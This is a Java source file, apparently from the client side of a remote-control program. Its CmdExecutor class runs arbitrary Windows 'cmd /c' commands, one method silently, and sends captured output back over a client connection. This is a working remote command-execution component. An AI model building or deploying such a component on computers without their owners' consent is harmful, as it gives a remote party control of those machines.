package client.features;

import client.connection.ClientConnection;
import client.connection.ID;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.concurrent.CountDownLatch;


public class CmdExecutor {
    private volatile String returnStr;
    private final CountDownLatch latch = new CountDownLatch(1);

    public static void executeCmd(String command){
        new Thread(() -> {
            try {
                Process process = Runtime.getRuntime().exec("cmd /c " + command);
                process.waitFor();
            } catch (IOException | InterruptedException ignored) {
            }
        }).start();
    }

    public void executeCmdCommand(String command, ClientConnection connection) throws Exception {
        returnStr = null;

        new Thread(() -> {
            try {
                // 执行命令
                Process process = Runtime.getRuntime().exec("cmd /c " + command);

                // 读取命令输出
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }

                // 等待命令执行完成
                process.waitFor();
                // 存储命令执行结果
                returnStr = output.toString().isEmpty() ? "None return\n" : output.toString();

            } catch (IOException | InterruptedException e) {
                // 捕获异常并记录错误信息
                returnStr = "error: " + e.getMessage();
            } finally {
                latch.countDown(); // 减少 CountDownLatch 的计数
            }
        }).start();

        new Thread(()->{
            try {
                Thread.sleep(3000);
                latch.countDown();
            } catch (InterruptedException ignored) {
            }
        }).start();

        try {
            latch.await();
        } catch (InterruptedException ignored) {
        }

        connection.sendMessage(ID.CMD_OUT(), "Command Return: \n" + returnStr);
        System.gc();
    }

}

